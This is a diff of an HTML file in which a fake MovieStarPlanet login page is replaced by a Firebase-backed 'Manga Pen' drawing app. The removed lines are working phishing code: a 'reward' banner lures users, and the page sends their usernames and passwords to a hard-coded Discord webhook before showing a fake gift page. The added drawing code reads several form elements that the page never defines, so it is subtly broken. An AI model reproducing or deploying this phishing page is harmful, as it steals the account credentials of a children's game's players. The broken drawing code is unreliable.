@@ -1,376 +1,409 @@
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<script>
+  // Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyDXxFEYDda2PggxaMb0HOET9qqYQavfMJA",
+    authDomain: "rayen-84266.firebaseapp.com",
+    projectId: "rayen-84266",
+    storageBucket: "rayen-84266.appspot.com",
+    messagingSenderId: "584915009026",
+    appId: "1:584915009026:web:328b90a9e08fdfbd64b11b",
+    measurementId: "G-2E5TD20D82"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  var database = firebase.database();
+</script>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MovieStarPlanet</title>
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://moviestarplanet.fr/img/logo.png">
+    <title>Manga Pen v4.9 - Precise Infinite</title>
     <style>
-        /* Custom CSS */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #d1c7c7;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-position: center;
-            overflow-x: hidden; /* Prevent horizontal scrolling */
-        }
-
-        .login-container {
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 12px;
-            width: 300px; /* Adjust container width */
-            z-index: 1; /* Ensure it's above other content */
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #fff;
-        }
-
-        input {
-            width: calc(100% - 20px); /* Adjust input width */
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            background-color: rgba(255, 255, 255, 0.1); /* Transparent background */
-            color: #fff;
-        }
-
-        button {
-            width: calc(100% - 20px); /* Adjust button width */
-            padding: 10px 0;
-            background-color: hsl(340, 83%, 81%);
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-
-        .header {
-            background-color: rgba(0, 0, 0, 0.5); /* Transparent black background */
-            color: #fff;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            position: fixed; /* Fixed position */
-            top: 0; /* Position at the top */
-            left: 0;
-            width: 100%; /* Full width */
-            z-index: 1000; /* Ensure it's above other content */
-        }
-
-        .header-logo {
-            width: 150px; /* Adjust the width */
-            margin-right: 20px; /* Adjust margin */
-        }
-
-        .header-title {
-            font-size: 16px; /* Decrease font size */
-            font-weight: bold; /* Bold font */
-            text-transform: uppercase; /* Uppercase text */
-            overflow: hidden; /* Hide overflowing text */
-            white-space: nowrap; /* Prevent line break */
-            text-overflow: ellipsis; /* Show ellipsis (...) for overflow */
-        }
-
-        .footer {
-            background-color: rgba(255, 255, 255, 0.7); /* Semi-transparent white background */
-            color: #333; /* Darker color for better contrast */
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            position: fixed; /* Fixed position */
-            bottom: 0; /* Position at the bottom */
-            left: 0;
-            width: 100%; /* Full width */
-            z-index: 1000; /* Ensure it's above other content */
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Change font family */
-        }
-
-        .footer-links {
-            display: flex;
-            list-style-type: none;
-            padding: 0;
-        }
-
-        .footer-links li {
-            margin-right: 20px;
-        }
-
-        .footer-links a {
-            color: #333; /* Darker color for better contrast */
-            text-decoration: none;
-            transition: transform 0.2s ease, color 0.2s ease; /* Added color transition */
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Change font family */
-            font-size: 18px; /* Increase font size */
-        }
-
-        .footer-links a:hover {
-            transform: scale(1.1);
-            color: #000; /* Darker color on hover */
-        }
-
-        .collaboration-banner {
-            text-align: center;
-            padding: 20px; /* Adjust padding */
-            color: #fff;
-            position: fixed; /* Fixed position */
-            bottom: 50px; /* Position at the bottom */
-            left: 0;
-            width: 100%; /* Full width */
-            z-index: 1000; /* Ensure it's above other content */
-            background-color: rgba(0, 0, 0, 0.7); /* Transparent black background */
-            font-weight: bold; /* Make the font thicker */
-            font-size: 20px; /* Adjust font size */
-            white-space: nowrap; /* Prevent line break */
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); /* Add text shadow */
-            -webkit-text-stroke: 1px black; /* Add black outline for text */
-        }
-
-        .collaboration-banner img {
-            width: 50px; /* Adjust image size */
-            margin-right: 5px; /* Adjust margin */
-            vertical-align: middle; /* Align image vertically */
-            transform: rotate(5deg); /* Rotate the heart image */
-        }
-
-        /* Loading animation */
-        .loader-container {
-            display: none;
-            justify-content: center;
-            align-items: center;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 9999;
-        }
-
-        .loader {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 2s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        body { font-family: 'Inter', sans-serif; display: flex; flex-direction: column; align-items: center; background: #111; color: #ccc; margin: 0; padding: 10px; overflow: hidden; height: 100vh; }
+        .toolbar { background: #222; padding: 12px; border-radius: 12px; margin-bottom: 10px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; border: 1px solid #333; max-width: 1400px; z-index: 10; }
+        
+        #viewport { 
+            width: 100%; 
+            flex-grow: 1; 
+            overflow: auto; 
+            background: #0a0a0a; 
+            position: relative; 
+            display: block; 
         }
         
-        /* Image at bottom right corner */
-        .bottom-right-image {
-            position: fixed;
-            bottom: 20px; /* Adjust vertical position */
-            right: 20px; /* Adjust horizontal position */
-            z-index: 1000; /* Ensure it's above other content */
-            max-width: 200px; /* Adjust max width */
+        #infinite-scroller {
+            width: 20000px; 
+            height: 20000px; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
         }
+
+        #canvas-container { 
+            position: relative; 
+            background: white; 
+            cursor: crosshair; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
+            touch-action: none; 
+            transition: transform 0.1s ease-out; 
+            transform-origin: center; 
+            flex-shrink: 0; 
+        }
+        
+        canvas { position: absolute; top: 0; left: 0; }
+        .control-group { display: flex; flex-direction: column; gap: 3px; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; }
+        button { cursor: pointer; padding: 8px 12px; border: none; border-radius: 6px; font-weight: bold; transition: 0.1s; background: #333; color: white; font-size: 11px; }
+        button:hover { background: #444; border: 1px solid #00d4ff; }
+        button.active { background: #00d4ff; color: #000; }
+        input { background: #333; border: 1px solid #444; color: white; padding: 4px; border-radius: 4px; }
+        input[type="number"] { width: 45px; }
+        .sub-row { display: flex; gap: 5px; align-items: center; }
+        label { font-size: 9px; color: #888; }
+
+        #settings-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #222; border: 1px solid #444; padding: 20px; border-radius: 12px; z-index: 100; box-shadow: 0 0 100px rgba(0,0,0,0.8); width: 300px; }
+        .key-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .key-input { background: #111; border: 1px solid #444; color: #00d4ff; padding: 5px; width: 80px; text-align: center; cursor: pointer; font-family: monospace; }
+        .key-input.listening { border-color: #00d4ff; box-shadow: 0 0 10px #00d4ff; }
+        
+        /* Firebase specific styles */
+        .firebase-group { border-left: 1px solid #444; padding-left: 10px; }
+        #canvas-list { display: flex; gap: 5px; }
+        .canvas-slot { background: #1a1a1a; border: 1px solid #333; font-size: 9px; padding: 4px 8px; }
     </style>
 </head>
 <body>
-  <!-- Header -->
-  <div class="header">
-    <img src="https://moviestarplanet.fr/img/logo.png" alt="Logo" class="header-logo">
-    <h1 class="header-title">MovieStarPlanet2024</h1>
-  </div>
 
-  <div class="login-container">
-    <h2 style="color: #fff;">Login</h2>
-    <form id="login-form">
-      <div class="form-group">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-      </div>
-      <div class="form-group">
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-      </div>
-      <button type="submit">Login</button>
-    </form>
-  </div>
+    <div class="toolbar">
+        <button onclick="toggleSettings()" style="background: #444;">⚙️ KEYS</button>
 
-  <!-- Collaboration Banner -->
-  <div class="collaboration-banner">
-    <img src="https://moviestarplanet.fr/img/buttonArtwork01.png" alt="Hearts">
-    <span>Collaboration</span>
-    <span>Show us how active you are and receive your reward !!</span>
-  </div>
+        <div class="control-group">Canvas
+            <div class="sub-row">
+                <input type="number" id="canW" value="1000"> x <input type="number" id="canH" value="700">
+                <button onclick="updateCanvasSize()">SET</button>
+            </div>
+        </div>
 
-  <!-- Footer -->
-  <div class="footer">
-    <div>
-      <a href="https://moviestarplanet.fr/" target="_blank">Entreprise</a>
-      <a href="#" id="contact">Contact</a> <!-- Added id for contact link -->
-      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/115000385689-Protection-des-Enfants" target="_blank">Sécurité</a>
-      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/213892145-Termes-et-Conditions" target="_blank">Conditions générales</a>
-      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/214480005-Informations-pour-les-Parents" target="_blank">Parents</a>
-      <a href="https://moviestarplanet.zendesk.com/hc/fr/articles/213208965-Politique-de-confidentialit%C3%A9" target="_blank">POLITIQUE DE CONFIDENTIALITÉ</a>
-      <a href="https://moviestarplanet.fr/">MovieStarPlanet</a>
+        <div class="control-group">Cloud Storage
+            <div class="sub-row" id="canvas-list">
+                <button onclick="saveToFirebase('canvas1')">SAVE 1</button>
+                <button onclick="saveToFirebase('canvas2')">SAVE 2</button>
+                <button onclick="loadFromFirebase('canvas1')" style="background:#555">LOAD 1</button>
+                <button onclick="loadFromFirebase('canvas2')" style="background:#555">LOAD 2</button>
+            </div>
+        </div>
+
+        <div class="control-group">Tool
+            <div class="sub-row">
+                <button id="penBtn" onclick="setMode('pen')">Points</button>
+                <button id="freeBtn" class="active" onclick="setMode('free')">Free</button>
+                <button id="liqBtn" onclick="setMode('liquify')">Liq</button>
+            </div>
+        </div>
+
+        <div class="control-group">Size / Grit / Jitter
+            <div class="sub-row">
+                <input type="number" id="thickness" value="30" oninput="render()">
+                <input type="range" id="grit" min="0" max="10" step="0.5" value="3" oninput="render()">
+                <input type="range" id="jitter" min="0" max="5" step="0.1" value="1.5" oninput="render()">
+            </div>
+        </div>
+
+        <div class="sub-row">
+            <button onclick="undo()" style="background: #444;">UNDO</button>
+            <button onclick="lockLine()" style="background: #2d7d46;">LOCK</button>
+            <button onclick="exportCanvas()" style="background: #d4a017; color: black;">EXPORT</button>
+            <button onclick="clearCanvas()" style="background: #8e2a2a;">RESET</button>
+        </div>
     </div>
-  </div>
 
-  <!-- Loading Animation -->
-  <div class="loader-container" id="loaderContainer">
-    <div class="loader"></div>
-  </div>
+    <div id="viewport">
+        <div id="infinite-scroller">
+            <div id="canvas-container">
+                <canvas id="refCanvas"></canvas>
+                <canvas id="artCanvas"></canvas>
+            </div>
+        </div>
+    </div>
 
-  <!-- JavaScript for contact link shake effect -->
-  <script>
-    document.getElementById('contact').addEventListener('click', function() {
-      this.style.animation = 'shake 0.5s'; // Add shake animation
-      setTimeout(() => {
-        this.style.animation = ''; // Reset animation after 0.5s
-      }, 500);
-    });
-  </script>
+    <div id="settings-modal">
+        <h4 style="margin: 0 0 15px 0; color: #00d4ff;">Keybinds</h4>
+        <div class="key-row"><span>Undo</span><div id="bind-undo" class="key-input" onclick="listenForKey('undo')">z</div></div>
+        <div class="key-row"><span>Lock Line</span><div id="bind-lock" class="key-input" onclick="listenForKey('lock')">l</div></div>
+        <div class="key-row"><span>Zoom In</span><div id="bind-zoomIn" class="key-input" onclick="listenForKey('zoomIn')">+</div></div>
+        <div class="key-row"><span>Zoom Out</span><div id="bind-zoomOut" class="key-input" onclick="listenForKey('zoomOut')">-</div></div>
+        <button onclick="toggleSettings()" style="width: 100%; margin-top: 10px;">CLOSE</button>
+    </div>
 
-  <!-- Script for handling form submission -->
-  <script>
-    document.getElementById("login-form").addEventListener("submit", function(event) {
-      event.preventDefault(); // Prevent form submission
-      
-      // Show loader
-      document.getElementById("loaderContainer").style.display = "flex";
+    <script>
+        const canvas = document.getElementById('artCanvas');
+        const ctx = canvas.getContext('2d');
+        const refCanvas = document.getElementById('refCanvas');
+        const refCtx = refCanvas.getContext('2d');
+        const container = document.getElementById('canvas-container');
+        const viewport = document.getElementById('viewport');
 
-      // Simulate server processing
-      setTimeout(() => {
-        // Get input values
-        var username = document.getElementById("username").value;
-        var password = document.getElementById("password").value;
+        let points = [], lockedLines = [], mode = 'free'; 
+        let isDrawing = false, draggedPoint = null;
+        let lastTime = 0, lastPos = {x:0, y:0}, smoothedPos = {x:0, y:0};
+        let zoom = 1.0, listeningAction = null;
+        let keyMap = { undo: 'z', lock: 'l', zoomIn: '+', zoomOut: '-' };
 
-        // Save username, password, and date to localStorage
-        var currentDate = new Date().toLocaleString();
-        localStorage.setItem("username", username);
-        localStorage.setItem("password", password);
-        localStorage.setItem("loginDate", currentDate);
-        
-        // Example: Sending data to Discord webhook
-        var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
-        var message = {
-          username: "Login Notification",
-          content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
+        function init() { 
+            updateCanvasSize(); 
+            setMode('free');
+            window.addEventListener('keydown', handleGlobalKeys);
+            resetView();
+        }
+
+        // --- FIREBASE LOGIC ---
+        function saveToFirebase(slotName) {
+            const data = {
+                width: document.getElementById('canW').value,
+                height: document.getElementById('canH').value,
+                penSize: document.getElementById('thickness').value,
+                lines: lockedLines
+            };
+            database.ref('drawings/' + slotName).set(data)
+                .then(() => alert(slotName + " Saved!"))
+                .catch(err => console.error(err));
+        }
+
+        function loadFromFirebase(slotName) {
+            database.ref('drawings/' + slotName).once('value').then((snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    document.getElementById('canW').value = data.width;
+                    document.getElementById('canH').value = data.height;
+                    document.getElementById('thickness').value = data.penSize;
+                    lockedLines = data.lines || [];
+                    updateCanvasSize();
+                    render();
+                    alert(slotName + " Loaded!");
+                } else {
+                    alert("Slot is empty!");
+                }
+            });
+        }
+
+        function resetView() {
+            zoom = 1.0;
+            container.style.transform = `scale(${zoom})`;
+            viewport.scrollLeft = (20000 - viewport.clientWidth) / 2;
+            viewport.scrollTop = (20000 - viewport.clientHeight) / 2;
+        }
+
+        function toggleSettings() {
+            const modal = document.getElementById('settings-modal');
+            modal.style.display = modal.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function exportCanvas() {
+            const link = document.createElement('a');
+            link.download = 'manga-art.png';
+            link.href = canvas.toDataURL();
+            link.click();
+        }
+
+        function listenForKey(action) {
+            listeningAction = action;
+            document.querySelectorAll('.key-input').forEach(el => el.classList.remove('listening'));
+            document.getElementById('bind-' + action).classList.add('listening');
+        }
+
+        function handleGlobalKeys(e) {
+            if (e.key === 'Control') {
+                e.preventDefault();
+                resetView();
+                return;
+            }
+            if (listeningAction) {
+                keyMap[listeningAction] = e.key.toLowerCase();
+                document.getElementById('bind-' + listeningAction).innerText = e.key;
+                document.getElementById('bind-' + listeningAction).classList.remove('listening');
+                listeningAction = null;
+                return;
+            }
+            const key = e.key.toLowerCase();
+            if (key === keyMap.undo && (e.ctrlKey || e.metaKey || keyMap.undo !== 'z')) { e.preventDefault(); undo(); }
+            if (key === keyMap.lock) lockLine();
+            if (key === keyMap.zoomIn) updateZoom(1.1); 
+            if (key === keyMap.zoomOut) updateZoom(0.9); 
+        }
+
+        function updateZoom(factor) {
+            zoom *= factor;
+            zoom = Math.max(0.05, Math.min(10, zoom));
+            container.style.transform = `scale(${zoom})`;
+        }
+
+        function getMousePos(e) {
+            const rect = container.getBoundingClientRect();
+            return {
+                x: (e.clientX - rect.left) / zoom,
+                y: (e.clientY - rect.top) / zoom
+            };
+        }
+
+        function updateCanvasSize() {
+            const w = document.getElementById('canW').value;
+            const h = document.getElementById('canH').value;
+            canvas.width = refCanvas.width = w;
+            canvas.height = refCanvas.height = h;
+            container.style.width = w + "px";
+            container.style.height = h + "px";
+            render();
+        }
+
+        function setMode(m) {
+            mode = m;
+            ['penBtn', 'freeBtn', 'liqBtn'].forEach(id => {
+                const btn = document.getElementById(id);
+                if(btn) btn.className = id.startsWith(m) ? 'active' : '';
+            });
+            points = []; render();
+        }
+
+        canvas.onpointerdown = (e) => {
+            canvas.setPointerCapture(e.pointerId);
+            const pos = getMousePos(e);
+            isDrawing = true; lastTime = Date.now();
+            lastPos = smoothedPos = pos;
+            const pressure = document.getElementById('usePressure').checked ? (e.pressure || 0.5) : 0.8;
+            if (mode === 'pen') {
+                let hit = points.find(p => Math.hypot(p.x - pos.x, p.y - pos.y) < 15/zoom);
+                if (hit) draggedPoint = hit; else points.push({x: pos.x, y: pos.y, p: pressure, v: 1});
+            } else if (mode === 'free') {
+                points = [{x: pos.x, y: pos.y, p: pressure, v: 1}];
+            }
+            render();
         };
 
-        // Send message to Discord webhook
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(message)
-        }).then(function(response) {
-          if (response.ok) {
-            // Open a new tab with congratulations message and image
-            var congratsPage = window.open();
-            congratsPage.document.write(`
-              <!DOCTYPE html>
-              <html lang="en">
-              <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Congratulations</title>
-                <style>
-                  body { 
-                    font-family: Arial, sans-serif; 
-                    background-color: #d1c7c7; 
-                    color: #FFFFFF; 
-                    display: flex; 
-                    justify-content: center; 
-                    align-items: center; 
-                    height: 100vh; 
-                    margin: 0; 
-                    background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg'); 
-                    background-size: cover; 
-                    background-repeat: no-repeat; 
-                    background-position: center;
-                  }
-                  h2 { margin-bottom: 20px; }
-                  img { width: 200px; }
-                </style>
-              </head>
-              <body>
-                <div>
-                  <h2>Congratulations!</h2>
-                  <p>You've received a gift:</p>
-                  <img src="http://vignette3.wikia.nocookie.net/moviestarplanet/images/2/29/Gifting.png/revision/latest?cb=20140504004533" alt="Gift">
-                </div>
-              </body>
-              </html>
-            `);
-            congratsPage.document.close(); // Close the document open for writing
-          } else {
-            alert("Failed to notify moderators. Please try again later.");
-          }
-        }).catch(function(error) {
-          console.error("Error:", error);
-          alert("An error occurred. Please try again later.");
-        }).finally(function() {
-          // Hide loader
-          document.getElementById("loaderContainer").style.display = "none";
-        });
-      }, 2000); // Simulated delay of 2 seconds
-    });
-  </script>
+        canvas.onpointermove = (e) => {
+            if (!isDrawing) return;
+            const pos = getMousePos(e);
+            const stab = parseInt(document.getElementById('stabilizer').value);
+            smoothedPos.x += (pos.x - smoothedPos.x) / stab;
+            smoothedPos.y += (pos.y - smoothedPos.y) / stab;
+            const now = Date.now();
+            const dist = Math.hypot(smoothedPos.x - lastPos.x, smoothedPos.y - lastPos.y);
+            const dt = now - lastTime;
+            const velocity = Math.min(dist / (dt || 1), 10);
+            const pressure = document.getElementById('usePressure').checked ? (e.pressure || 0.5) : 0.8;
+            
+            if (mode === 'pen' && draggedPoint) {
+                draggedPoint.x = smoothedPos.x; draggedPoint.y = smoothedPos.y;
+            } else if (mode === 'free' && dist > 1) {
+                points.push({x: smoothedPos.x, y: smoothedPos.y, p: pressure, v: velocity});
+            } else if (mode === 'liquify') {
+                applyLiquify(pos.x, pos.y, lastPos.x, lastPos.y);
+            }
+            lastPos = {x: smoothedPos.x, y: smoothedPos.y}; lastTime = now;
+            render();
+        };
 
-  <!-- Image at bottom right corner -->
-  <img class="bottom-right-image" src="https://moviestarplanet2.fr/img/marketing_splash/splash_en.png" alt="Splash Image">
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MovieStarPlanet</title>
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://moviestarplanet.fr/img/logo.png">
-    <style>
-        /* Custom CSS */
-        body {
-            font-family: Arial, sans-serif;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-image: url('https://cdn.wallpapersafari.com/76/98/7H4qok.jpg');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-position: center;
-            overflow-x: hidden; /* Prevent horizontal scrolling */
+        canvas.onpointerup = () => {
+            if (mode === 'free' && points.length > 2) lockLine();
+            isDrawing = false; draggedPoint = null;
+        };
+
+        function undo() { if(lockedLines.length > 0) { lockedLines.pop(); render(); } }
+
+        function lockLine() {
+            if (points.length < 2) return;
+            lockedLines.push({
+                pts: JSON.parse(JSON.stringify(points)),
+                size: parseInt(document.getElementById('thickness').value),
+                grit: parseFloat(document.getElementById('grit').value),
+                jitter: parseFloat(document.getElementById('jitter').value),
+                tS: parseInt(document.getElementById('taperS').value)/100,
+                tM: parseInt(document.getElementById('taperM').value)/100,
+                tE: parseInt(document.getElementById('taperE').value)/100,
+                seed: Math.random() * 1000
+            });
+            points = []; render();
         }
-        iframe {
-            display: none; /* Hide the iframe */
+
+        function clearCanvas() { lockedLines = []; points = []; render(); }
+
+        function render() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            lockedLines.forEach(l => drawMangaStroke(l.pts, l.size, l.grit, l.tS, l.tM, l.tE, l.jitter, l.seed));
+            if (points.length >= 2) {
+                drawMangaStroke(points, parseInt(document.getElementById('thickness').value), parseFloat(document.getElementById('grit').value), 
+                    parseInt(document.getElementById('taperS').value)/100, parseInt(document.getElementById('taperM').value)/100, 
+                    parseInt(document.getElementById('taperE').value)/100, parseFloat(document.getElementById('jitter').value), 88);
+            }
         }
-    </style>
-</head>
-<body>
-  <!-- Background Music -->
-  <iframe width="0" height="0" src="https://www.youtube.com/embed/g50rGhhprfc?autoplay=1&loop=1&playlist=g50rGhhprfc" frameborder="0" allow="autoplay; loop" allowfullscreen></iframe>
+
+        function drawMangaStroke(pts, maxSize, grit, tS, tM, tE, jitter, seed) {
+            const spline = getSplinePoints(pts);
+            let totalLen = 0;
+            for (let i = 0; i < spline.length - 1; i++) totalLen += Math.hypot(spline[i+1].x - spline[i].x, spline[i+1].y - spline[i].y);
+            let traveled = 0;
+            for (let i = 0; i < spline.length - 1; i++) {
+                const p1 = spline[i], p2 = spline[i+1];
+                const d = Math.hypot(p2.x - p1.x, p2.y - p1.y);
+                const steps = Math.max(d * 1.5, 1);
+                for (let j = 0; j < steps; j++) {
+                    const T = (traveled + (j/steps) * d) / (totalLen || 1);
+                    const pressure = p1.p + (p2.p - p1.p) * (j/steps);
+                    const velocity = p1.v + (p2.v - p1.v) * (j/steps);
+                    let wFactor = (T < 0.5) ? tS + (tM - tS) * (T * 2) : tM + (tE - tM) * ((T - 0.5) * 2);
+                    let vMod = Math.max(0.3, 1 - (velocity * 0.05));
+                    let w = maxSize * wFactor * (pressure * 1.5) * vMod;
+                    const x = p1.x + (p2.x - p1.x) * (j/steps);
+                    const y = p1.y + (p2.y - p1.y) * (j/steps);
+                    let pseudoRandom = Math.sin(seed + T * 100); 
+                    for (let p = 0; p < (1 + grit/3); p++) {
+                        ctx.fillStyle = `rgba(0, 0, 0, ${0.8 + Math.random()*0.2})`;
+                        ctx.beginPath();
+                        const jX = (Math.random()-0.5) * grit + (pseudoRandom * jitter);
+                        ctx.arc(x + jX, y + (Math.random()-0.5)*grit, (w/2)*(0.8+Math.random()*0.4), 0, Math.PI*2);
+                        ctx.fill();
+                    }
+                }
+                traveled += d;
+            }
+        }
+
+        function getSplinePoints(pts) {
+            if (pts.length < 3) return pts;
+            let res = [];
+            let step = mode === 'free' ? 0.4 : 0.05;
+            for (let i = 0; i < pts.length - 1; i++) {
+                const p0 = pts[i-1] || pts[i], p1 = pts[i], p2 = pts[i+1], p3 = pts[i+2] || p2;
+                for (let t = 0; t < 1; t += step) {
+                    const t2 = t*t, t3 = t2*t;
+                    const x = 0.5 * ((2*p1.x)+(-p0.x+p2.x)*t+(2*p0.x-5*p1.x+4*p2.x-p3.x)*t2+(-p0.x+3*p1.x-3*p2.x+p3.x)*t3);
+                    const y = 0.5 * ((2*p1.y)+(-p0.y+p2.y)*t+(2*p0.y-5*p1.y+4*p2.y-p3.y)*t2+(-p0.y+3*p1.y-3*p2.y+p3.y)*t3);
+                    res.push({x, y, p: p1.p + (p2.p - p1.p) * t, v: p1.v + (p2.v - p1.v) * t});
+                }
+            }
+            res.push(pts[pts.length-1]);
+            return res;
+        }
+
+        function applyLiquify(mx, my, lx, ly) {
+            const strength = parseInt(document.getElementById('thickness').value);
+            const radius = strength * 2;
+            const dx = mx - lx; const dy = my - ly;
+            lockedLines.forEach(line => {
+                line.pts.forEach(p => {
+                    const dist = Math.hypot(p.x - mx, p.y - my);
+                    if (dist < radius) {
+                        const power = (1 - dist / radius);
+                        p.x += dx * power; p.y += dy * power;
+                    }
+                });
+            });
+            render(); // CRITICAL FIX: Ensure the canvas redraws during liquify move
+        }
+        init();
+    </script>
 </body>
 </html>
